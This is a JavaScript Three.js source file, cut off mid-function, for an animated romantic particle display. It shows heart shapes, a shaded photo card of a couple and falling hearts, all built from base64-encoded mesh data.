(() => {
'use strict';
const SAI_RAW = window.SAI_DATA;
const OSHSU_RAW = window.OSHSU_LOGO_DATA || window.SAI_DATA;
const N = SAI_RAW.particleCount;
const MODE = { HEART: 0, STREAM: 1, LOGO: 2, RAIN: 3 };
const $ = s => document.querySelector(s);
let unlockedRealPhoto = false;
let questCompleted = false;
let camOn = false;
let camRequesting = false;
function b64ToBytes(b64) {
const bin = atob(b64);
const u8 = new Uint8Array(bin.length);
for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
return u8.buffer;
}
const saiInvScale = 1.0 / SAI_RAW.posScale;
const saiPosI16  = new Int16Array(b64ToBytes(SAI_RAW.partPosB64));
const saiDirI8   = new Int8Array(b64ToBytes(SAI_RAW.partDirB64));
const saiScU8    = new Uint8Array(b64ToBytes(SAI_RAW.partScaleB64));
const saiRoleU8  = new Uint8Array(b64ToBytes(SAI_RAW.partRoleB64));
const saiRgbU8   = new Uint8Array(b64ToBytes(SAI_RAW.partRgbB64));
const saiLogoP = new Float32Array(N * 3);
const saiLogoD = new Float32Array(N * 3);
const saiLogoS = new Float32Array(N);
for (let i = 0; i < N; i++) {
const i3 = i * 3;
saiLogoP[i3]     = saiPosI16[i3]     * saiInvScale;
saiLogoP[i3 + 1] = saiPosI16[i3 + 1] * saiInvScale;
saiLogoP[i3 + 2] = saiPosI16[i3 + 2] * saiInvScale;
let dx = saiDirI8[i3] / 127.0;
let dy = saiDirI8[i3 + 1] / 127.0;
let dz = saiDirI8[i3 + 2] / 127.0;
const dl = Math.hypot(dx, dy, dz) || 1.0;
saiLogoD[i3]     = dx / dl;
saiLogoD[i3 + 1] = dy / dl;
saiLogoD[i3 + 2] = dz / dl;
saiLogoS[i] = saiScU8[i] / 255.0;
}
const oshsuN = OSHSU_RAW.particleCount || N;
const oshsuInvScale = 1.0 / (OSHSU_RAW.posScale || 6000.0);
const oshsuPosI16 = new Int16Array(b64ToBytes(OSHSU_RAW.partPosB64));
const oshsuDirI8  = new Int8Array(b64ToBytes(OSHSU_RAW.partDirB64));
const oshsuScU8   = new Uint8Array(b64ToBytes(OSHSU_RAW.partScaleB64));
const oshsuRoleRaw = new Uint8Array(b64ToBytes(OSHSU_RAW.partRoleB64));
const oshsuLogoP = new Float32Array(N * 3);
const oshsuLogoD = new Float32Array(N * 3);
const oshsuLogoS = new Float32Array(N);
const oshsuRoleU8 = new Uint8Array(N);
for (let i = 0; i < N; i++) {
const j = i % oshsuN;
const i3 = i * 3, j3 = j * 3;
const extraJit = i >= oshsuN ? ((i % 7) - 3) * 0.0012 : 0.0;
oshsuLogoP[i3]     = oshsuPosI16[j3]     * oshsuInvScale + extraJit;
oshsuLogoP[i3 + 1] = oshsuPosI16[j3 + 1] * oshsuInvScale - extraJit;
oshsuLogoP[i3 + 2] = oshsuPosI16[j3 + 2] * oshsuInvScale;
let dx = oshsuDirI8[j3] / 127.0;
let dy = oshsuDirI8[j3 + 1] / 127.0;
let dz = oshsuDirI8[j3 + 2] / 127.0;
const dl = Math.hypot(dx, dy, dz) || 1.0;
oshsuLogoD[i3]     = dx / dl;
oshsuLogoD[i3 + 1] = dy / dl;
oshsuLogoD[i3 + 2] = dz / dl;
oshsuLogoS[i] = oshsuScU8[j] / 255.0;
oshsuRoleU8[i] = oshsuRoleRaw[j];
}
let logoP = oshsuLogoP;
let logoD = oshsuLogoD;
let logoS = oshsuLogoS;
let partRoleU8 = oshsuRoleU8;
const HEART_LUT_SIZE = 1024;
const heartX = new Float32Array(HEART_LUT_SIZE);
const heartY = new Float32Array(HEART_LUT_SIZE);
const heartTX = new Float32Array(HEART_LUT_SIZE);
const heartTY = new Float32Array(HEART_LUT_SIZE);
{
const M_RAW = 4096;
const rx = new Float64Array(M_RAW + 1);
const ry = new Float64Array(M_RAW + 1);
const cum = new Float64Array(M_RAW + 1);
for (let k = 0; k <= M_RAW; k++) {
const a = (k / M_RAW) * Math.PI * 2;
const sa = Math.sin(a);
rx[k] = (16.0 * sa * sa * sa) / 15.0;
ry[k] = (13.0 * Math.cos(a) - 5.0 * Math.cos(2 * a) - 2.0 * Math.cos(3 * a) - Math.cos(4 * a) + 2.5) / 15.0;
if (k > 0) {
cum[k] = cum[k - 1] + Math.hypot(rx[k] - rx[k - 1], ry[k] - ry[k - 1]);
}
}
const totalLen = cum[M_RAW];
let ptr = 0;
for (let j = 0; j < HEART_LUT_SIZE; j++) {
const targetS = (j / HEART_LUT_SIZE) * totalLen;
while (ptr < M_RAW - 1 && cum[ptr + 1] < targetS) ptr++;
const seg = Math.max(1e-9, cum[ptr + 1] - cum[ptr]);
const u = (targetS - cum[ptr]) / seg;
heartX[j] = rx[ptr] + u * (rx[ptr + 1] - rx[ptr]);
heartY[j] = ry[ptr] + u * (ry[ptr + 1] - ry[ptr]);
}
for (let j = 0; j < HEART_LUT_SIZE; j++) {
const jp = (j + 1) % HEART_LUT_SIZE;
const jm = (j + HEART_LUT_SIZE - 1) % HEART_LUT_SIZE;
const dx = heartX[jp] - heartX[jm];
const dy = heartY[jp] - heartY[jm];
const dl = Math.hypot(dx, dy) || 1.0;
heartTX[j] = dx / dl;
heartTY[j] = dy / dl;
}
}
const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent) || (navigator.maxTouchPoints > 1 && innerWidth < 900);
const canvas = $('#c');
const renderer = new THREE.WebGLRenderer({ canvas, antialias: false, powerPreference: 'high-performance', preserveDrawingBuffer: false });
renderer.setPixelRatio(Math.min(window.devicePixelRatio || 1, isMobile ? 1.0 : 1.6));
renderer.setClearColor(0x000000);
const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(50, 1, 0.1, 100);
camera.position.set(0, 0, 10);
const HALF_H = Math.tan(THREE.MathUtils.degToRad(25)) * 10;
let viewFit = 1.0;
const composer = new THREE.EffectComposer(renderer);
composer.addPass(new THREE.RenderPass(scene, camera));
const bloom = new THREE.UnrealBloomPass(new THREE.Vector2(512, 512), 0.24, 0.30, 0.58);
composer.addPass(bloom);
const bgUniforms = {
uTime: { value: 0.0 },
uAspect: { value: 1.0 },
uCenter: { value: new THREE.Vector2(0.0, 0.0) },
uBeat: { value: 0.0 }
};
{
const bgMat = new THREE.ShaderMaterial({
uniforms: bgUniforms,
vertexShader: `
varying vec2 vUv;
void main() {
vUv = uv;
gl_Position = vec4(position.xy, 0.9999, 1.0);
}
`,
fragmentShader: `
uniform float uTime;
uniform float uAspect;
uniform vec2 uCenter;
uniform float uBeat;
varying vec2 vUv;
void main() {
vec2 p = (vUv - 0.5) * 2.0;
p.x *= uAspect;
vec2 c = uCenter;
float distC = length((p - c) * vec2(0.85, 0.95));
float dist0 = length(p * vec2(0.75, 0.90));
// Deep velvet romantic night sky with warm rose-burgundy & candlelight golden aura
float glowC = exp(-distC * distC * 0.42) * (0.88 + 0.22 * uBeat);
float glowAmb = exp(-dist0 * dist0 * 0.18);
vec3 nightCol = vec3(0.018, 0.004, 0.010);
vec3 wineRose = vec3(0.115, 0.018, 0.045);
vec3 warmGold = vec3(0.110, 0.055, 0.025);
vec3 col = nightCol + wineRose * glowAmb * 0.65 + mix(wineRose, warmGold, 0.45 + 0.25 * sin(uTime * 0.5)) * glowC * 0.85;
// Soft drifting romantic bokeh & twinkling starlight in deep background
for (int k = 0; k < ${isMobile ? 1 : 2}; k++) {
float fk = float(k);
vec2 uvB = p * (2.2 + fk * 1.4) - vec2(sin(uTime * 0.12 + fk) * 0.4, uTime * (0.14 + fk * 0.06));
vec2 id = floor(uvB);
vec2 fr = fract(uvB) - 0.5;
float rnd = fract(sin(dot(id, vec2(12.9898 + fk * 7.0, 78.233))) * 43758.5453);
vec2 ofs = vec2(fract(rnd * 13.3) - 0.5, fract(rnd * 27.9) - 0.5) * 0.46;
float d = length(fr - ofs);
float rad = 0.12 + 0.16 * fract(rnd * 41.2);
float bokeh = smoothstep(rad, rad * 0.15, d) * (0.4 + 0.6 * sin(uTime * (1.5 + rnd * 2.0) + rnd * 6.28));
vec3 bCol = mix(vec3(1.0, 0.38, 0.55), vec3(1.0, 0.82, 0.52), fract(rnd * 19.7));
col += bCol * bokeh * (0.045 - fk * 0.015) * (0.35 + 0.65 * glowAmb);
}
gl_FragColor = vec4(col, 1.0);
}
`,
depthTest: false,
depthWrite: false
});
const bgQuad = new THREE.Mesh(new THREE.PlaneGeometry(2, 2), bgMat);
bgQuad.frustumCulled = false;
bgQuad.renderOrder = -10;
scene.add(bgQuad);
}
const BG_HEART_COUNT = isMobile ? 28 : 72;
let bgHeartsMesh = null;
const bgHX = new Float32Array(BG_HEART_COUNT);
const bgHY = new Float32Array(BG_HEART_COUNT);
const bgHZ = new Float32Array(BG_HEART_COUNT);
const bgHV = new Float32Array(BG_HEART_COUNT);
const bgHPh = new Float32Array(BG_HEART_COUNT);
const bgHSc = new Float32Array(BG_HEART_COUNT);
{
const pos = [], col = [];
const M_H = 28;
for (let k = 0; k < M_H; k++) {
const a1 = (k / M_H) * Math.PI * 2;
const a2 = ((k + 1) / M_H) * Math.PI * 2;
const s1 = Math.sin(a1), s2 = Math.sin(a2);
const x1 = (16 * s1 * s1 * s1) / 16, y1 = (13 * Math.cos(a1) - 5 * Math.cos(2 * a1) - 2 * Math.cos(3 * a1) - Math.cos(4 * a1) + 2.5) / 16;
const x2 = (16 * s2 * s2 * s2) / 16, y2 = (13 * Math.cos(a2) - 5 * Math.cos(2 * a2) - 2 * Math.cos(3 * a2) - Math.cos(4 * a2) + 2.5) / 16;
pos.push(0, 0, 0.03, x1, y1, 0, x2, y2, 0);
col.push(0.95, 0.85, 0.88, 0.65, 0.45, 0.50, 0.65, 0.45, 0.50);
}
const hg = new THREE.BufferGeometry();
hg.setAttribute('position', new THREE.Float32BufferAttribute(pos, 3));
hg.setAttribute('color', new THREE.Float32BufferAttribute(col, 3));
const hm = new THREE.MeshBasicMaterial({
vertexColors: true,
transparent: true,
opacity: 0.34,
blending: THREE.AdditiveBlending,
depthWrite: false,
side: THREE.DoubleSide
});
bgHeartsMesh = new THREE.InstancedMesh(hg, hm, BG_HEART_COUNT);
bgHeartsMesh.frustumCulled = false;
bgHeartsMesh.instanceMatrix.setUsage(THREE.DynamicDrawUsage);
const hc = new THREE.Color();
for (let i = 0; i < BG_HEART_COUNT; i++) {
bgHX[i] = (Math.random() - 0.5) * 15;
bgHY[i] = (Math.random() - 0.5) * 12;
bgHZ[i] = -7.5 + Math.random() * 5.5;
bgHV[i] = 0.28 + Math.random() * 0.48;
bgHPh[i] = Math.random() * Math.PI * 2;
bgHSc[i] = 0.055 + Math.random() * 0.085;
if (i % 3 === 0) {
hc.setHSL(0.10 + Math.random() * 0.03, 0.92, 0.52);
} else {
hc.setHSL(0.965 + Math.random() * 0.04, 0.92, 0.46);
}
bgHeartsMesh.setColorAt(i, hc);
}
scene.add(bgHeartsMesh);
}
const ambLight = new THREE.AmbientLight(0xffd6cc, 0.28);
scene.add(ambLight);
const keyLight = new THREE.DirectionalLight(0xffe8d6, 0.85);
keyLight.position.set(3.5, 4.5, 6.5);
scene.add(keyLight);
const rimLight = new THREE.DirectionalLight(0xd92b18, 0.65);
rimLight.position.set(-4.5, 2.0, 3.5);
scene.add(rimLight);
const bottomLight = new THREE.DirectionalLight(0xd99b52, 0.35);
bottomLight.position.set(0.0, -4.5, 4.0);
scene.add(bottomLight);
let oshsuCoreMesh = null;
let oshsuCoreMat = null;
if (OSHSU_RAW && OSHSU_RAW.meshPosB64) {
const omPosI16 = new Int16Array(b64ToBytes(OSHSU_RAW.meshPosB64));
const omNrmI8  = new Int8Array(b64ToBytes(OSHSU_RAW.meshNrmB64));
const omIdxU16 = new Uint16Array(b64ToBytes(OSHSU_RAW.meshIdxB64));
const ofPos = new Float32Array(omPosI16.length);
const ofNrm = new Float32Array(omNrmI8.length);
for (let i = 0; i < omPosI16.length; i++) ofPos[i] = omPosI16[i] * oshsuInvScale;
for (let i = 0; i < omNrmI8.length; i += 3) {
const nx = omNrmI8[i], ny = omNrmI8[i + 1], nz = omNrmI8[i + 2];
const l = Math.hypot(nx, ny, nz) || 1.0;
ofNrm[i] = nx / l; ofNrm[i + 1] = ny / l; ofNrm[i + 2] = nz / l;
}
const oGeo = new THREE.BufferGeometry();
oGeo.setAttribute('position', new THREE.BufferAttribute(ofPos, 3));
oGeo.setAttribute('normal', new THREE.BufferAttribute(ofNrm, 3));
oGeo.setIndex(new THREE.BufferAttribute(omIdxU16, 1));
oshsuCoreMat = new THREE.MeshPhongMaterial({
color: 0x480503,
emissive: 0x120100,
specular: 0x9e624e,
shininess: 55,
transparent: true,
opacity: 0.0,
depthWrite: false,
side: THREE.FrontSide
});
oshsuCoreMesh = new THREE.Mesh(oGeo, oshsuCoreMat);
oshsuCoreMesh.visible = false;
scene.add(oshsuCoreMesh);
}
let logoCoreMesh = null;
let logoCoreMat = null;
{
const mPosI16 = new Int16Array(b64ToBytes(SAI_RAW.meshPosB64));
const mNrmI8  = new Int8Array(b64ToBytes(SAI_RAW.meshNrmB64));
const mUvU16  = new Uint16Array(b64ToBytes(SAI_RAW.meshUvB64));
const mIdxU16 = new Uint16Array(b64ToBytes(SAI_RAW.meshIdxB64));
const fPos = new Float32Array(mPosI16.length);
const fNrm = new Float32Array(mNrmI8.length);
const fUv  = new Float32Array(mUvU16.length);
for (let i = 0; i < mPosI16.length; i++) fPos[i] = mPosI16[i] * saiInvScale;
for (let i = 0; i < mNrmI8.length; i += 3) {
const nx = mNrmI8[i], ny = mNrmI8[i + 1], nz = mNrmI8[i + 2];
const l = Math.hypot(nx, ny, nz) || 1.0;
fNrm[i] = nx / l; fNrm[i + 1] = ny / l; fNrm[i + 2] = nz / l;
}
for (let i = 0; i < mUvU16.length; i++) fUv[i] = mUvU16[i] / 65535.0;
const geo = new THREE.BufferGeometry();
geo.setAttribute('position', new THREE.BufferAttribute(fPos, 3));
geo.setAttribute('normal', new THREE.BufferAttribute(fNrm, 3));
geo.setAttribute('uv', new THREE.BufferAttribute(fUv, 2));
geo.setIndex(new THREE.BufferAttribute(mIdxU16, 1));
const saiTex = new THREE.Texture();
saiTex.minFilter = THREE.LinearFilter;
saiTex.magFilter = THREE.LinearFilter;
saiTex.generateMipmaps = false;
const img = new Image();
img.onload = () => {
saiTex.image = img;
saiTex.needsUpdate = true;
};
img.src = SAI_RAW.imageDataUrl;
logoCoreMat = new THREE.ShaderMaterial({
uniforms: {
uTex: { value: saiTex },
uTime: { value: 0.0 },
uOpacity: { value: 0.0 },
uTilt: { value: new THREE.Vector2(0.0, 0.0) }
},
vertexShader: `
uniform float uTime;
uniform vec2 uTilt;
varying vec2 vUv;
varying vec3 vPos;
varying vec3 vNrm;
void main() {
vUv = uv;
vNrm = normal;
vec3 p = position;
// Enhance 3D bas-relief sculptural volume + subtle living breathing on the couple
float fg = exp(-((uv.x - 0.50) * (uv.x - 0.50) / 0.13 + (uv.y - 0.46) * (uv.y - 0.46) / 0.19));
p.z = p.z * 1.45 + sin(uTime * 1.85) * 0.012 * fg;
vPos = p;
gl_Position = projectionMatrix * modelViewMatrix * vec4(p, 1.0);
}
`,
fragmentShader: `
uniform sampler2D uTex;
uniform float uTime;
uniform float uOpacity;
uniform vec2 uTilt;
varying vec2 vUv;
varying vec3 vPos;
varying vec3 vNrm;
float rrectSDF(vec2 p, vec2 b, float r) {
vec2 q = abs(p) - (b - vec2(r));
return length(max(q, 0.0)) + min(max(q.x, q.y), 0.0) - r;
}
void main() {
// Foreground mask for the couple (girl + boy + shoulders) vs sunlit foliage background
float gFace = exp(-((vUv.x - 0.41) * (vUv.x - 0.41) / 0.028 + (vUv.y - 0.58) * (vUv.y - 0.58) / 0.032));
float bFace = exp(-((vUv.x - 0.63) * (vUv.x - 0.63) / 0.028 + (vUv.y - 0.75) * (vUv.y - 0.75) / 0.032));
float torso = exp(-((vUv.x - 0.49) * (vUv.x - 0.49) / 0.145 + (vUv.y - 0.24) * (vUv.y - 0.24) / 0.115));
float fgMask = clamp(max(max(gFace, bFace), torso * 0.95), 0.0, 1.0);
float bgMask = 1.0 - fgMask;
// Subtle, realistic 2.5D depth separation between foreground couple and foliage background
vec2 uv = vUv;
float breathY = sin(uTime * 1.85) * 0.0016 * fgMask;
vec2 fgShift = uTilt * 0.0075 * fgMask + vec2(0.0, breathY);
float breeze = sin(vUv.y * 14.0 + uTime * 1.5 + vUv.x * 7.0) * 0.0010 * bgMask;
vec2 bgShift = -uTilt * 0.0048 * bgMask + vec2(breeze, 0.0);
uv = clamp(uv + fgShift + bgShift, 0.004, 0.996);
vec3 col = texture2D(uTex, uv).rgb;
// Natural 3D relief shading from dynamic light direction tied to card tilt
vec3 n = normalize(vNrm);
vec3 lightDir = normalize(vec3(uTilt.x * 1.35 + sin(uTime * 0.7) * 0.22, uTilt.y * 1.35 + 0.28, 1.0));
float diff = dot(n, lightDir);
float spec = pow(max(0.0, diff), 5.0);
// Warm sunlit highlight on raised 3D relief + romantic golden-hour glow in background foliage
col *= 0.94 + 0.11 * max(0.0, diff);
col += vec3(0.98, 0.86, 0.66) * spec * 0.08 * (0.4 + 0.6 * fgMask);
float lum = dot(col, vec3(0.299, 0.587, 0.114));
float sunGlow = smoothstep(0.54, 0.88, lum) * bgMask;
col += vec3(0.14, 0.08, 0.03) * sunGlow * (0.55 + 0.45 * sin(uTime * 1.8 + vUv.x * 4.0));
// Soft drifting golden-blush dust motes in the sunlit trees behind the couple
vec2 bUv = vUv * vec2(8.0, 10.0) - vec2(sin(uTime * 0.35) * 0.4, uTime * 0.48);
vec2 bId = floor(bUv);
vec2 bFr = fract(bUv) - 0.5;
float rndM = fract(sin(dot(bId, vec2(12.9898, 78.233))) * 43758.5453);
vec2 moteOfs = vec2(fract(rndM * 13.7) - 0.5, fract(rndM * 29.3) - 0.5) * 0.44;
float mote = smoothstep(0.15, 0.02, length(bFr - moteOfs)) * (0.5 + 0.5 * sin(uTime * 2.8 + rndM * 6.28));
col += vec3(1.0, 0.84, 0.52) * mote * bgMask * smoothstep(0.28, 0.68, vUv.y) * 0.22;
// Soft, natural warm sunlight sheen gliding across the 3D relief
float sweepPhase = sin(uTime * 0.65) * 0.85;
float diag = (vUv.x - 0.5) * 0.75 - (vUv.y - 0.5) * 0.55 - sweepPhase + uTilt.x * 0.80;
float sheen = exp(-diag * diag * 22.0);
col += vec3(0.95, 0.84, 0.58) * sheen * (0.06 + 0.08 * spec);
// Living Animated Corner Lines inside the painting (no outer shimmering frame)
float d = rrectSDF(vPos.xy, vec2(1.62, 2.16), 0.20);
// Coordinate sArm: 0.0 at each of the 4 corners, increasing along horizontal & vertical arms
float ax = abs(vPos.x);
float ay = abs(vPos.y);
float armH = max(0.0, 1.45 - ax) / 0.88; // horizontal arm from corner (~35% of width)
float armV = max(0.0, 1.99 - ay) / 1.18; // vertical arm from corner (~35% of height)
float sArm = armH + armV;
// Breathing reach of the corner lines (extends to marked spots and slightly further)
float maxReach = 0.92 + 0.22 * (0.5 + 0.5 * sin(uTime * 1.75));
// Keep full strength near corner apex (sArm < 0.2) and taper smoothly toward arrow tips
float armEnvelope = smoothstep(maxReach, 0.0, sArm) * smoothstep(maxReach, maxReach * 0.55, sArm * 0.75);
// Travelling golden waves & light pulses flowing outward from the corner (sArm = 0 -> maxReach)
float flowPhase = sArm * 13.0 - uTime * 3.8;
float flowPulse = pow(0.5 + 0.5 * cos(flowPhase), 4.0);
float sparkBead = pow(0.5 + 0.5 * cos(sArm * 22.0 - uTime * 5.2), 10.0);
// Primary animated inner corner line (gently undulating as energy flows from the corner)
float waveShift1 = sin(sArm * 10.0 - uTime * 3.2) * 0.0045 * smoothstep(0.0, 0.25, sArm);
float line1 = exp(-pow((d + 0.064 + waveShift1) * 125.0, 2.0));
// Secondary weaving filigree vine line near the corner that merges/tapers along the arms
float waveShift2 = cos(sArm * 14.0 - uTime * 4.0) * 0.0075;
float line2 = exp(-pow((d + 0.092 + waveShift2) * 140.0, 2.0)) * smoothstep(maxReach * 0.78, 0.0, sArm);
// Glowing chevron/leaf accents along the animated corner line (like the arrows in the sketch)
float chev = exp(-pow((d + 0.076 - (fract(sArm * 4.5 - uTime * 1.1) - 0.5) * 0.028) * 130.0, 2.0))
* smoothstep(0.06, 0.20, sArm) * smoothstep(maxReach * 0.85, 0.25, sArm) * 0.55;
float innerCornerAnim = (line1 * (0.65 + 0.55 * flowPulse + 0.45 * sparkBead) + line2 * (0.45 + 0.40 * flowPulse) + chev) * armEnvelope;
vec3 warmGold = vec3(0.90, 0.74, 0.42);
vec3 sunlitCr = vec3(1.00, 0.95, 0.80);
vec3 innerCol = mix(warmGold, sunlitCr, 0.35 + 0.65 * max(flowPulse, sparkBead));
col = mix(col, innerCol * (1.12 + 0.38 * flowPulse), clamp(innerCornerAnim, 0.0, 1.0));
// Gentle 3D depth shading right along the inner frame edge to give real physical depth
float edgeDepth = smoothstep(-0.015, -0.18, d);
col *= 0.86 + 0.14 * edgeDepth;
float alphaEdge = smoothstep(0.005, -0.020, d);
gl_FragColor = vec4(col, uOpacity * alphaEdge);
}
`,
transparent: true,
depthWrite: false,
side: THREE.DoubleSide
});
logoCoreMesh = new THREE.Mesh(geo, logoCoreMat);
logoCoreMesh.visible = false;
scene.add(logoCoreMesh);
}
function buildCrystalShard() {
const pos = [], col = [];
const tri = (a, b, c, ca, cb, cc) => {
pos.push(...a, ...b, ...c);
col.push(ca, ca, ca, cb, cb, cb, cc, cc, cc);
};
const top = [0, 0.52, 0];
const bot = [0, -0.48, 0];
const w = 0.044, t = 0.034, ym = 0.05;
const r = [[w, ym, 0], [0, ym, t], [-w, ym, 0], [0, ym, -t]];
for (let j = 0; j < 4; j++) {
const j2 = (j + 1) % 4;
const shade = (j % 2 === 0) ? 0.42 : 0.32;
tri(r[j], r[j2], top, shade, shade, 0.68);
tri(r[j2], r[j], bot, shade, shade, 0.22);
}
const g = new THREE.BufferGeometry();
g.setAttribute('position', new THREE.Float32BufferAttribute(pos, 3));
g.setAttribute('color', new THREE.Float32BufferAttribute(col, 3));
return g;
}
function buildTrail() {
const pos = [], col = [];
const w = 0.020;
[[1, 0], [0, 1]].forEach(([x, z]) => {
pos.push(-w * x, -0.42, -w * z, w * x, -0.42, w * z, 0, -1.55, 0);
col.push(0.22, 0.22, 0.22, 0.22, 0.22, 0.22, 0, 0, 0);
});
const g = new THREE.BufferGeometry();
g.setAttribute('position', new THREE.Float32BufferAttribute(pos, 3));
g.setAttribute('color', new THREE.Float32BufferAttribute(col, 3));
return g;
}
const mkMat = op => new THREE.MeshBasicMaterial({
vertexColors: true,
transparent: true,
opacity: op,
blending: THREE.AdditiveBlending,
depthWrite: false,
side: THREE.DoubleSide
});
const shardMat = mkMat(0.62);
const trailMat = mkMat(0.26);
const shards = new THREE.InstancedMesh(buildCrystalShard(), shardMat, N);
const trails = new THREE.InstancedMesh(buildTrail(), trailMat, N);
[shards, trails].forEach(m => {
m.frustumCulled = false;
m.instanceMatrix.setUsage(THREE.DynamicDrawUsage);
scene.add(m);
});
const baseR = new Float32Array(N), baseG = new Float32Array(N), baseB = new Float32Array(N);
const saiImgR = new Float32Array(N), saiImgG = new Float32Array(N), saiImgB = new Float32Array(N);
const oshsuImgR = new Float32Array(N), oshsuImgG = new Float32Array(N), oshsuImgB = new Float32Array(N);
{
const c = new THREE.Color();
const cOsh = new THREE.Color();
for (let i = 0; i < N; i++) {
const role = saiRoleU8[i];
if (role === 2) {
c.setHSL(0.102 + Math.random() * 0.024, 0.94, 0.46 + Math.random() * 0.08);
} else if (role === 1) {
c.setHSL(0.975 + Math.random() * 0.032, 0.95, 0.40 + Math.random() * 0.08);
} else {
c.setHSL(0.968 + Math.random() * 0.035, 0.92, 0.26 + Math.random() * 0.08);
}
baseR[i] = c.r; baseG[i] = c.g; baseB[i] = c.b;
const i3 = i * 3;
saiImgR[i] = (saiRgbU8[i3]     / 255.0) * 0.72;
saiImgG[i] = (saiRgbU8[i3 + 1] / 255.0) * 0.72;
saiImgB[i] = (saiRgbU8[i3 + 2] / 255.0) * 0.72;
const oRole = oshsuRoleU8[i];
if (oRole === 2) {
cOsh.setHSL(0.102 + Math.random() * 0.022, 0.94, 0.44 + Math.random() * 0.07);
} else if (oRole === 1) {
cOsh.setHSL(0.007 + Math.random() * 0.018, 0.95, 0.37 + Math.random() * 0.06);
} else {
cOsh.setHSL(0.003 + Math.random() * 0.014, 0.92, 0.24 + Math.random() * 0.06);
}
oshsuImgR[i] = cOsh.r; oshsuImgG[i] = cOsh.g; oshsuImgB[i] = cOsh.b;
shards.setColorAt(i, c);
trails.setColorAt(i, c);
}
shards.instanceColor.setUsage(THREE.DynamicDrawUsage);
trails.instanceColor.setUsage(THREE.DynamicDrawUsage);
}
let imgR = oshsuImgR, imgG = oshsuImgG, imgB = oshsuImgB;
function unlockRealSaiPhoto() {
unlockedRealPhoto = true;
logoP = saiLogoP;
logoD = saiLogoD;
logoS = saiLogoS;
partRoleU8 = saiRoleU8;
imgR = saiImgR;
imgG = saiImgG;
imgB = saiImgB;
}
const HEART_RAIN_COUNT = isMobile ? 550 : 1400;
let heartRainMesh = null;
let heartRainMat = null;
{
const pos = [], col = [];
const M_H = 28;
for (let k = 0; k < M_H; k++) {
const a1 = (k / M_H) * Math.PI * 2;
const a2 = ((k + 1) / M_H) * Math.PI * 2;
const s1 = Math.sin(a1), s2 = Math.sin(a2);
const x1 = (16 * s1 * s1 * s1) / 16;
const y1 = (13 * Math.cos(a1) - 5 * Math.cos(2 * a1) - 2 * Math.cos(3 * a1) - Math.cos(4 * a1) + 2.5) / 16;
const x2 = (16 * s2 * s2 * s2) / 16;
const y2 = (13 * Math.cos(a2) - 5 * Math.cos(2 * a2) - 2 * Math.cos(3 * a2) - Math.cos(4 * a2) + 2.5) / 16;
const rimShade1 = 0.58 + 0.18 * Math.max(0, y1);
const rimShade2 = 0.58 + 0.18 * Math.max(0, y2);
pos.push(0, 0.08, 0.22, x1, y1, 0, x2, y2, 0);
col.push(1.0, 0.90, 0.94, rimShade1, rimShade1 * 0.72, rimShade1 * 0.78, rimShade2, rimShade2 * 0.72, rimShade2 * 0.78);
pos.push(0, 0.08, -0.22, x2, y2, 0, x1, y1, 0);
col.push(0.84, 0.72, 0.76, rimShade2, rimShade2 * 0.72, rimShade2 * 0.78, rimShade1, rimShade1 * 0.72, rimShade1 * 0.78);
}
const hGeo = new THREE.BufferGeometry();
hGeo.setAttribute('position', new THREE.Float32BufferAttribute(pos, 3));
hGeo.setAttribute('color', new THREE.Float32BufferAttribute(col, 3));
heartRainMat = new THREE.MeshBasicMaterial({
vertexColors: true,
transparent: true,
opacity: 0.0,
blending: THREE.AdditiveBlending,
depthWrite: false,
side: THREE.DoubleSide
});
heartRainMesh = new THREE.InstancedMesh(hGeo, heartRainMat, HEART_RAIN_COUNT);
heartRainMesh.frustumCulled = false;
heartRainMesh.visible = false;
heartRainMesh.instanceMatrix.setUsage(THREE.DynamicDrawUsage);
const hc = new THREE.Color();
for (let i = 0; i < HEART_RAIN_COUNT; i++) {
const r = i % 6;
if (r === 0) {
hc.setHSL(0.102 + Math.random() * 0.025, 0.95, 0.54);
} else if (r === 1 || r === 2) {
hc.setHSL(0.955 + Math.random() * 0.035, 0.94, 0.54);
} else {
hc.setHSL(0.975 + Math.random() * 0.025, 0.96, 0.42 + Math.random() * 0.10);
}
heartRainMesh.setColorAt(i, hc);
}
scene.add(heartRainMesh);
}
const px = new Float32Array(N), py = new Float32Array(N), pz = new Float32Array(N);
const vx = new Float32Array(N), vy = new Float32Array(N), vz = new Float32Array(N);
const qx = new Float32Array(N), qy = new Float32Array(N), qz = new Float32Array(N), qw = new Float32Array(N);
const sxSeed = new Float32Array(N), sySeed = new Float32Array(N), szSeed = new Float32Array(N);
const ph = new Float32Array(N), rnd = new Float32Array(N);
const rainX = new Float32Array(N), rainY = new Float32Array(N), rainZ = new Float32Array(N), rainV = new Float32Array(N);
for (let i = 0; i < N; i++) {
px[i] = (Math.random() - 0.5) * 7;
py[i] = (Math.random() - 0.5) * 7;
pz[i] = (Math.random() - 0.5) * 2.5;
qw[i] = 1.0;
sxSeed[i] = Math.random() * 2 - 1;
sySeed[i] = Math.random() * 2 - 1;
szSeed[i] = Math.random() * 2 - 1;
ph[i] = Math.random() * Math.PI * 2;
rnd[i] = Math.random();
rainX[i] = (Math.random() - 0.5) * 2.0;
rainY[i] = -7.2 + Math.random() * 14.4;
rainZ[i] = -8.5 + Math.random() * 10.5;
const dir = (i % 10 < 7) ? -1.0 : 1.0;
rainV[i] = dir * (1.15 + Math.random() * 1.75);
}
let mode = MODE.HEART;
let prevNonFistMode = MODE.HEART;
let trailCur = 0.25, scaleCur = 0.6, coreOpacity = 0.0, colorMix = 0.0, heartRainAlpha = 0.0;
const anchor = new THREE.Vector3(0, -1.2, 0), anchorT = new THREE.Vector3(0, -1.2, 0);
const tip = new THREE.Vector3(0, 0, 0), tipT = new THREE.Vector3(0, 0, 0);
const anchorV = new THREE.Vector3(), tipV = new THREE.Vector3();
let handScale = 1.0, handScaleT = 1.0;
let handRoll = 0.0, handRollT = 0.0;
const hist = [];
function dampVec(cur, tgt, vel, w, dt) {
const x = w * dt, e = 1 / (1 + x + 0.48 * x * x + 0.235 * x * x * x);
const cx = cur.x - tgt.x, tx = (vel.x + w * cx) * dt;
vel.x = (vel.x - w * tx) * e; cur.x = tgt.x + (cx + tx) * e;
const cy = cur.y - tgt.y, ty = (vel.y + w * cy) * dt;
vel.y = (vel.y - w * ty) * e; cur.y = tgt.y + (cy + ty) * e;
const cz = cur.z - tgt.z, tz = (vel.z + w * cz) * dt;
vel.z = (vel.z - w * tz) * e; cur.z = tgt.z + (cz + tz) * e;
}
function sampleHist(t, out) {
